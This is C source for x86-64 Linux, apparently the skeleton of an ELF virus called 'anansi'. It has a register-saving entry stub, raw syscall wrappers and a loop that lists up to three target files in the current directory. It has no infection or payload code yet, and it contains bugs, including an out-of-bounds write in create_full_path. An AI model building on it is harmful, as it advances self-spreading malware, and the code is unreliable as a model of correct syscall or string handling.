#define _GNU_SOURCE           /* See feature_test_macros(7) */
#include<dirent.h>
#include<sys/syscall.h>
#include<unistd.h>
#include<sys/stat.h>
#include<sys/mman.h>
#include<linux/limits.h>
#include<fcntl.h>

#define STDOUT STDOUT_FILENO
#define FAILURE -1
#define SUCCESS 0


#ifndef MAX_TARGET
	#define MAX_TARGET 3
#endif

extern unsigned long real_start;
// functions unique to anansi
char *create_full_path(char *directory, char *filename);

// anansi syscall prototypes
int anansi_exit(int status);
long anansi_write(int fd, const void *buf, size_t count);
long anansi_read(int fd, void *buf, size_t count);
void *anansi_mmap(void *addr, size_t len, int prot, int flags, int fildes, off_t off);
long anansi_stat(char *path, struct stat *statbuf);
long anansi_munmap(void *addr, size_t len);
long anansi_open(const char *pathname, int flags, int mode);
long anansi_getdents64(int fd, void *dirp, size_t count);
long anansi_getcwd(char *buf, size_t size);
long anansi_close(int fd);

//anansi libc-like function implementation prototypes

size_t anansi_strlen(const char *s);
void *anansi_malloc(size_t len);
void anansi_strncpy(char *restrict dest, const char *src, size_t n);

struct linux_dirent {
	unsigned long  d_ino;     /* Inode number */
	unsigned long  d_off;     /* Offset to next linux_dirent */
	unsigned short d_reclen;  /* Length of this linux_dirent */
	char           d_name[NAME_MAX +1];  /* Filename (null-terminated) */
};

int _start() {
	__asm__ volatile (
			".globl real_start\n"
			"real_start:\n"
			"push %rsp\n" //preserve rsp first since push will alter the value.
			"push %rbp\n"
			"push %rax\n"
			"push %rbx\n"
			"push %rcx\n"
			"push %rdx\n"
			"push %rsi\n"
			"push %rdi\n"
			"push %r8\n"
			"push %r9\n"
			"push %r10\n"
			"push %r11\n"
			"push %r12\n"
			"push %r13\n"
			"push %r14\n"
			"push %r15\n"
			"call vx_main\n"
			"pop %r15\n"
			"pop %r14\n"
			"pop %r13\n"
			"pop %r12\n"
			"pop %r11\n"
			"pop %r10\n"
			"pop %r9\n"
			"pop %r8\n"
			"pop %rdi\n"
			"pop %rsi\n"
			"pop %rdx\n"
			"pop %rcx\n"
			"pop %rbx\n"
			"pop %rax\n"
			"pop %rbp\n"
			"pop %rsp\n"
			);
}

void vx_main()
{
	char *cwd = NULL;
	char *cwd_listings = NULL;
	char *full_path = NULL;

	struct linux_dirent *d;
	int cwd_fd, nread, status = SUCCESS, max_target = MAX_TARGET;
	const size_t DIR_LISTING_SIZE = 5000;

	if(!(cwd = anansi_malloc(PATH_MAX))) {
		status = FAILURE;
		goto clean_up;
	}

	if(!(cwd_listings = anansi_malloc(DIR_LISTING_SIZE))) {
		status = FAILURE;
		goto clean_up;
	}

	anansi_getcwd(cwd, PATH_MAX);
	if((cwd_fd = anansi_open(cwd, O_RDONLY | O_DIRECTORY, 0)) < 0) {
		status = FAILURE;
		goto clean_up;
	}

	nread = anansi_getdents64(cwd_fd, cwd_listings, DIR_LISTING_SIZE);
	d = (struct linux_dirent *)cwd_listings;

	for(long entry = 0; entry < nread; entry += d->d_reclen) {
		d = (struct linux_dirent *) (cwd_listings + entry);
		if(d->d_name[0] == '.' )
			continue;

		if(!max_target)
			break;

		if(!(full_path = create_full_path(cwd, d->d_name)))
			continue;

		anansi_write(STDOUT, full_path, anansi_strlen(full_path));
		anansi_write(STDOUT, "\n", 1);
		anansi_munmap(full_path, anansi_strlen(full_path) + 1);
		max_target--;
	}

clean_up:
	if(cwd != NULL)
		anansi_munmap(cwd, PATH_MAX);
	if(cwd_listings != NULL)
		anansi_munmap(cwd_listings, DIR_LISTING_SIZE);
	anansi_exit(status);
}

char *create_full_path(char *directory, char *filename)
{
	char *absolute_path;
	size_t filename_len = anansi_strlen(filename);
	size_t dir_len = anansi_strlen(directory);
	size_t allocatation_size  = anansi_strlen(directory) + filename_len;

	// 1 byte for null terminator and 1 byte for '/' appended to directory
	allocatation_size += 2;
	if(!(absolute_path = anansi_malloc(allocatation_size))) {
		return NULL;
	}

	anansi_strncpy(absolute_path, directory, allocatation_size);

	absolute_path[dir_len++] = '/';
	anansi_strncpy(absolute_path + dir_len, filename, filename_len);
	absolute_path[allocatation_size] = '\0';

	return absolute_path;
}

size_t anansi_strlen(const char *s)
{
	size_t len = 0;
	while(*s++ != '\0')
		len++;

	return len;
}

void *anansi_malloc(size_t len)
{
	void *mem;
	mem = anansi_mmap(NULL, len, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0);
	return mem;
}

void anansi_strncpy(char *restrict dest, const char *src, size_t n)
{
	while(n-- && *src != '\0')
		*dest++ = *src++;
	*dest  = '\0';
}

#define __load_syscall_ret(var) __asm__ __volatile__ ("mov %%rax, %0" : "=r" (var));
#define __write_syscall(type, name, arg1, arg1_type, arg2, arg2_type, arg3, arg3_type) \
	type name(arg1_type arg1, arg2_type arg2, arg3_type arg3) { \
		type ret; \
		__asm__ __volatile__ (\
				"movq $1, %%rax\n" \
				"movq %0, %%rdi\n" \
				"movq %1, %%rsi\n" \
				"movq %2, %%rdx\n" \
				"syscall" \
           			      : \
				      : "g" (arg1), "g" (arg2), "g" (arg3) \
				      : "%rax", "%rdi", "%rsi", "%rdx" \
		); \
		__load_syscall_ret(ret); \
		return ret; \
	}

#define __exit_syscall(type, name, arg1, arg1_type) \
	type name(arg1_type arg1) { \
		type  ret; \
		__asm__ __volatile__ ( \
				"movq $60, %%rax\n" \
				"syscall\n" \
			       	: "=r" (ret) \
				: "D" (arg1) \
				: "%rax" \
		); \
		return ret; \
	}

#define __read_syscall(type, name, arg1, arg1_type, arg2, arg2_type, arg3, arg3_type) \
	type name(arg1_type arg1, arg2_type arg2, arg3_type arg3) { \
		type ret; \
		__asm__ __volatile__ (\
				"movq $0, %%rax\n" \
				"movq %0, %%rdi\n" \
				"movq %1, %%rsi\n" \
				"movq %2, %%rdx\n" \
				"syscall" \
					: \
					: "g" (arg1), "g" (arg2), "g" (arg3) \
					: "%rax", "%rdi", "%rsi", "%rdx" \
		); \
		__load_syscall_ret(ret); \
		return ret; \
	}

#define __mmap_syscall(type, name, arg1, arg1_type, arg2,  arg2_type, arg3, arg3_type, arg4, arg4_type, arg5, arg5_type, arg6, arg6_type) \
        type name(arg1_type arg1, arg2_type arg2, arg3_type arg3, arg4_type arg4, arg5_type arg5, arg6_type arg6) { \
                type ret; \
                __asm__ __volatile__(\
                                "movq $9, %%rax\n" \
                                "movq %0, %%rdi\n" \
                                "movq %1, %%rsi\n" \
                                "movq %2, %%rdx\n" \
                                "movq %3, %%r10\n" \
                                "movq %4, %%r8\n" \
                                "movq %5, %%r9\n" \
                                "syscall" \
                                        : \
                                        : "g" (arg1), "g" (arg2), "g" (arg3), "g" (arg4), "g" (arg5), "g" (arg6) \
                                        : "%rax", "%rdi", "%rsi", "%rdx", "%r10", "%r8", "%r9" \
                ); \
                __load_syscall_ret(ret); \
                return ret; \
        }
#define __stat_syscall(type, name, arg1, arg1_type, arg2, arg2_type) \
        type name(arg1_type arg1, arg2_type arg2) { \
                type ret; \
                __asm__ __volatile__(\
                                "movq $4, %%rax\n" \
                                "movq %0, %%rdi\n" \
                                "movq %1, %%rsi\n" \
                                "syscall" \
                                        : \
                                        : "g" (arg1), "g" (arg2) \
                                        : "%rax", "%rdi", "%rsi" \
                ); \
                __load_syscall_ret(ret); \
                return ret; \
        }

#define __munmap_syscall(type, name, arg1, arg1_type, arg2, arg2_type) \
        type name(arg1_type arg1, arg2_type arg2) { \
                type ret; \
                __asm__ __volatile__(\
                                "movq $11, %%rax\n" \
                                "movq %0, %%rdi\n" \
                                "movq %1, %%rsi\n" \
                                "syscall" \
                                        : \
                                        : "g" (arg1), "g" (arg2) \
                                        : "%rax", "%rdi", "%rsi" \
                ); \
                __load_syscall_ret(ret); \
                return ret; \
        }

#define __open_syscall(type, name, arg1, arg1_type, arg2, arg2_type, arg3, arg3_type) \
        type name(arg1_type arg1, arg2_type arg2, arg3_type arg3) { \
                type ret; \
                __asm__ __volatile__(\
                                "movq $2, %%rax\n" \
                                "movq %0, %%rdi\n" \
                                "movq %1, %%rsi\n" \
                                "movq %2, %%rdx\n" \
                                "syscall" \
                                        : \
                                        : "g" (arg1), "g" (arg2), "g" (arg3) \
                                        : "%rax", "%rdi", "%rsi", "%rdx" \
                ); \
                __load_syscall_ret(ret); \
                return ret; \
        }

#define __getdents64_syscall(type, name, arg1, arg1_type, arg2, arg2_type, arg3, arg3_type) \
        type name(arg1_type arg1, arg2_type arg2, arg3_type arg3) { \
                type ret; \
                __asm__ __volatile__(\
                                "movq $78,%%rax\n" \
                                "movq %0, %%rdi\n" \
                                "movq %1, %%rsi\n" \
                                "movq %2, %%rdx\n" \
                                "syscall" \
                                        : \
                                        : "g" (arg1), "g" (arg2), "g" (arg3) \
                                        : "%rax", "%rdi", "%rsi", "%rdx" \
                ); \
                __load_syscall_ret(ret); \
                return ret; \
        }

#define __getcwd_syscall(type, name, arg1, arg1_type, arg2, arg2_type) \
        type name(arg1_type arg1, arg2_type arg2) { \
                type ret; \
                __asm__ __volatile__(\
                                "movq $79, %%rax\n" \
                                "movq %0, %%rdi\n" \
                                "movq %1, %%rsi\n" \
                                "syscall" \
                                        : \
                                        : "g" (arg1), "g" (arg2) \
                                        : "%rax", "%rdi", "%rsi" \
                ); \
                __load_syscall_ret(ret); \
                return ret; \
        }

#define __close_syscall(type, name, arg1, arg1_type) \
        type name(arg1_type arg1) {\
                type ret; \
                __asm__ __volatile__(\
                                "movq $3, %%rax\n" \
                                "movq %0, %%rdi\n" \
                                "syscall" \
                                        : \
                                        : "g" (arg1) \
                                        : "%rax", "%rdi" \
                ); \
                __load_syscall_ret(ret); \
                return ret; \
        }

__exit_syscall(int, anansi_exit, status, int);
__write_syscall(long, anansi_write, fd, int, buf, const void *, count, size_t);
__read_syscall(long, anansi_read, fd, int, buf, void *, count, size_t);
__mmap_syscall(void *, anansi_mmap, addr, void *, length, size_t, prot, int, flags, int, fd, int, offset, off_t);
__stat_syscall(long, anansi_stat, path, char *, statbuf, struct stat *);
__munmap_syscall(long, anansi_munmap, addr, void *, len, size_t);
__open_syscall(long, anansi_open, pathname, const char *, flags, int, mode, int);
__getdents64_syscall(long, anansi_getdents64, fd, int, dirp, void *, count, size_t);
__getcwd_syscall(long, anansi_getcwd, buf, char *, size, size_t);
__close_syscall(long, anansi_close, fd, int);
